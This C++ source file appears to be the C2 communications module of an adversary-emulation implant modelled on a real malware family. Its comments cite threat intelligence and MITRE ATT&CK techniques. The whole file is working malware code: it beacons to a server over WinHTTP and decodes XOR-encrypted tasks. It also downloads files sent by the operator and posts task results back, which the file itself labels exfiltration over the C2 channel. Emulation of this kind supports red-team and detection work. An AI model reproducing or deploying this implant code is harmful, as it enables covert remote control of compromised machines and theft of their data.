#include "comms.h"
#include <iostream>
#include <iomanip>

StComms::StComms(std::string id, std::string ip, int p) 
{
	this->endpoint = "/search/" + id;
	this->ip_address = ip;
	this->port = p;
}

StComms::~StComms() {}

/**
* Creates the beacon request and passes the response to parsing functions
* 
* @param A pointer to the vector to contain the task fields
*/
bool StComms::getTask(std::vector<std::string>* pTaskVector)
{ 
    std::string obfuscatedTask = this->sendRequest(L"GET", this->ip_address, this->endpoint, std::string(""));
    
    if (obfuscatedTask.compare("failed") != 0)
    {
        parseHTML(obfuscatedTask);
        this->tokenizeResponse(obfuscatedTask, pTaskVector);
    }
    else
    {
        return false;
    }
    return true;
}

/**
* Splits an incoming task into a vector format
* 
* Decodes the original encoded string and splits the contents on the '|' symbol.
* It then checks if the instruction is null (-1 in the command index) before proceeding
* to decode the instruction portion of the task string. If the task is to download a file,
* again splits the string on the '|' symbol to split the arguments.
* 
* Pushes directly to the task vector.
* 
* @param The encrypted instruction string parsed from the HTTP response
* @param A pointer to the vector into which to push the instruction tokens
*/
void StComms::tokenizeResponse(std::string response, std::vector<std::string>* pTaskVector)
{
    std::string task = base64_decode(response);
    this->decrypt(task);
    splitOnPipe(task, pTaskVector);

    // Check for null task
    if (pTaskVector->at(0).compare("-1") != 0) 
    {

        //Decode the instruction portion
        pTaskVector->at(2) = base64_decode(pTaskVector->at(2));

        //If download id issued, split instruction again and add to the original vector
        if (pTaskVector->at(1).compare("102") == 0) {
            std::vector<std::string>* arguments = new std::vector<std::string>;
            splitOnPipe(pTaskVector->at(2), arguments);
            
            //pop the un-tokenized string
            pTaskVector->pop_back();

            //Add the arguments
            pTaskVector->insert(pTaskVector->end(), arguments->begin(), arguments->end());

            arguments->clear();
            delete arguments;
        }
    } 
}

/**
* Creates the file download request and decodes the file bytes before returning
* 
* @param the file name to grab from the server
* @param a reference to a string that will contain the decoded bytes
*/
int StComms::downloadFile(std::string filename, std::string &result) 
{ 
    std::string encodedFile = this->sendRequest(L"GET", this->ip_address, std::string(DOWNLOAD_ENDPOINT + filename), "");
    if (encodedFile.compare("failed") == 0)
    {
        return 1;
    }
    else 
    {
        result = base64_decode(encodedFile);
        this->decrypt(result);
    }
    return 0;
}

/**
* Prepares the task response string in JSON format
* 
* @param Command index number
* @param Task results
* @return the JSON response string 
*/
void StComms::prepareTaskResponse(std::string &responseString, std::string cmdIndex, std::string &taskResults)
{
    this->encrypt(taskResults);
    std::string response = base64_encode(taskResults);
    responseString = "{\"" + cmdIndex + "\":\"" + response + "\"}";
}

/**
* Prepares and sends the task results to the server
*
* @param Command index number
* @param Result to return
*
* MITRE ATT&CK Technique: T1041 - Exfiltration Over C2 Channel
*/
void StComms::postTaskResponse(std::string cmdIndex, std::string &taskResults) 
{
    std::string responseString;
    StComms::prepareTaskResponse(responseString, cmdIndex, taskResults);
    std::string result = StComms::sendRequest(L"POST", this->ip_address, this->endpoint, responseString);
}

/**
* Decrypts the incoming string
* 
* Per the CTI, the original implant utilizes a basic XOR encryption with
* a dynamically generated key. The key is generated with a random value
* that becomes the seed for a Mersenne Twister generator, the random value
* from which becomes the actual key. The seed for the Mersenne generator
* is part of the communication with the server (first four bytes)
* 
* Rather than dynamically generating a key, this implementation instead
* uses a hardcoded value, defined in comms.h.
* 
* @param A reference to the string to decrypt, decrypted in place.
*
* MITRE ATT&CK Technique: T1573.001 - Encrypted Channel: Symmetric Cryptography
*/
void StComms::decrypt(std::string &decodedString)
{
    size_t keySize = sizeof(this->key);
    for (int i = 0; i < decodedString.size(); ++i)
    {
        decodedString[i] = decodedString[i] ^ this->key[i % keySize];
    }
}

/**
* Decrypts the incoming string
*
* Per the CTI, the original implant utilizes a basic XOR encryption with
* a dynamically generated key. The key is generated with a random value
* that becomes the seed for a Mersenne Twister generator, the random value
* from which becomes the actual key. The seed for the Mersenne generator
* is part of the communication with the server (first four bytes)
*
* Rather than dynamically generating a key, this implementation instead
* uses a hardcoded value, defined in comms.h.
* 
* @param A reference to the string to encrypt, encrypted in place
*
* MITRE ATT&CK Technique: T1573.001 - Encrypted Channel: Symmetric Cryptography
*/
void StComms::encrypt(std::string &resultData)
{
    size_t keySize = sizeof(this->key);
    for (int i = 0; i < resultData.size(); ++i)
    {
        resultData[i] = resultData[i] ^ this->key[i % keySize];
    }
}

/**
* Sends the specified HTTP request to the server
* 
* @param Request type (POST, GET)
* @param The IP of the server
* @param The URL endpoint, appended after the IP
* @param A reference to the data to include with the request
* @return The result of the HTTP request, otherwise a failure message
*/
std::string StComms::sendRequest(LPCWSTR requestType, std::string ip, std::string endpoint, std::string const&data) 
{
    DWORD dwSize = 0;
    DWORD dwBytesRead = 0;
    LPSTR pszDataBuffer = { 0 };
    BOOL  bResponseSuccess = FALSE;
    BOOL  bRequestSuccess = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    std::wstring serverAddress = std::wstring(ip.begin(), ip.end());
    std::wstring endpointPath = std::wstring(endpoint.begin(), endpoint.end());

    // Obtain a session handle
    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    // Try to connect over the requested port
    if (hSession)
    {
        hConnect = WinHttpConnect(hSession, serverAddress.c_str(), this->port, 0);
    }

    // Try again on fallback port 80 if failed
    if (!hConnect) 
    {
        hConnect = WinHttpConnect(hSession, serverAddress.c_str(), FALLBACK_PORT, 0);
    }

    // Obtain a request handle
    if (hConnect)
    {
        hRequest = WinHttpOpenRequest(hConnect, requestType, endpointPath.c_str(),
            NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    }
        
    // Send the request
    if (hRequest) 
    {
        bRequestSuccess = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            (LPVOID)data.c_str(), data.size(), data.size(), 0);
    }

    // Start the receive process
    if (bRequestSuccess)
    {
        bResponseSuccess = WinHttpReceiveResponse(hRequest, NULL);
    }
    else
    {
        //printf("Error %d has occurred sending the HTTP request.\n", GetLastError());
        return "failed";
    }

    std::string receivedData = "";
    // Keep checking for data until there is nothing left.
    if (bResponseSuccess)
    {
        //check for 200 code
        DWORD status = 0;
        DWORD len = sizeof(status);
        bool bStatus = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &status, &len, NULL);
        if (status != (DWORD) 200) {
            return "failed";
        }
        do
        {
            // Check for available data
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            {
                //printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
            }

            // Allocate space for the buffer
            pszDataBuffer = new char[dwSize + 1];
            if (!pszDataBuffer)
            {
                //printf("Out of memory while reading HTTP response\n");
                dwSize = 0;
            }
            else
            {
                // Read the data
                ZeroMemory(pszDataBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszDataBuffer, dwSize, &dwBytesRead))
                {
                    //printf("Error %u in WinHttpReadData.\n", GetLastError());
                }
                else 
                {
                    receivedData += pszDataBuffer;
                }
                // Free the memory allocated to the buffer.
                delete[] pszDataBuffer;
            }
        } while (dwSize > 0);
    }
    else 
    {
        //printf("Error %d has occurred obtaining the HTTP response.\n", GetLastError());
        return "failed";
    }

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return receivedData;
}
